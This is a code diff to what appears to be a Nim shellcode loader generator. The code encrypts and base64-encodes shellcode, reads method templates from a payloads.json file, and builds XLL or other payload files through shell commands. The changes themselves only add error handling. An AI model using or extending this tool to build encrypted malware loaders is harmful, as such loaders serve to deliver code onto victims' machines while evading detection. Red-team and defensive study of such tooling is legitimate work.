@@ -162,8 +162,16 @@ proc main() =
         
     # Base64 encode encrypted shellcode
     let encodedCrypted = encode(encrypted)
-    var payloadFile = readFile("payloads.json")
-    var payloadData = parseJson(payloadFile)
+
+    var 
+        payloadFile: string
+        payloadData: JsonNode
+        
+    try:
+        payloadFile = readFile("payloads.json")
+        payloadData = parseJson(payloadFile)
+    except:
+        echo "Something went wrong when loading 'payloads.json', please re-clone the repo."
 
     echo "Encrypting and encoding payload. May your efforts be fruitful.\n\n"
 
@@ -172,21 +180,30 @@ proc main() =
     if fileType == "xll":
         file_path = payloadData["methods"][apiMethod]["filepaths"]["xll"].getStr()
         if file_path != "":
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            if payloadData["methods"][apiMethod][fileType]["payload"].getStr() != "":
-                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["payload"].getStr())
-                discard execShellCmd(payloadData["methods"][apiMethod][fileType]["cleanup"].getStr())
-            else:
-                echo "Error with the payload, could be that the payload type does not support that method\n\n"
+            try:
+                prePayloadGen(file_path, encodedCrypted, newpassword)
+                if payloadData["methods"][apiMethod][fileType]["payload"].getStr() != "":
+                    discard execShellCmd(payloadData["methods"][apiMethod][fileType]["payload"].getStr())
+                    discard execShellCmd(payloadData["methods"][apiMethod][fileType]["cleanup"].getStr())
+                else:
+                    echo "Error with the payload, could be that the payload type does not support that method\n\n"
+                    printHelp(true)
+            except:
+                echo "An error occurred when generating payload.\nPlease read help doc below\n"
                 printHelp(true)
     else:
         file_path = payloadData["methods"][apiMethod]["filepaths"]["standard"].getStr()
         if file_path != "":
-            prePayloadGen(file_path, encodedCrypted, newpassword)
-            if payloadData["methods"][apiMethod]["standard"][fileType].getStr() != "":
-                discard execShellCmd(payloadData["methods"][apiMethod]["standard"][fileType].getStr())
-            else:
-                echo "Error with the payload, could be that the payload type does not support that method\n\n"
+            try:
+                prePayloadGen(file_path, encodedCrypted, newpassword)
+                if payloadData["methods"][apiMethod]["standard"][fileType].getStr() != "":
+                    discard execShellCmd(payloadData["methods"][apiMethod]["standard"][fileType].getStr())
+                else:
+                    echo "Error with the payload, could be that the payload type does not support that method\n\n"
+                    printHelp(true)
+            except:
+                echo "An error occurred when generating payload.\nPlease read help doc below\n"
                 printHelp(true)
+
     postPayloadGen(file_path, encodedCrypted, newpassword)
 main()
